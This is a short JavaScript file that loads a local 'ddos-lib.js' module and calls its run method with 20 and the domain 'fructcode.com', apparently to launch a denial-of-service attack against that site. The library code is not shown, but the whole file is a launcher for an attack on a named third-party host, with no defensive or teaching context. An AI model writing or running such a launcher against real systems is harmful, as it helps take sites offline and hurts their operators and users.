const DDos = require('./ddos-lib.js');

const ddos = new DDos();

try {
  ddos.run(20, 'fructcode.com', '/');
} catch (e){
  console.log(e, 1212)
}
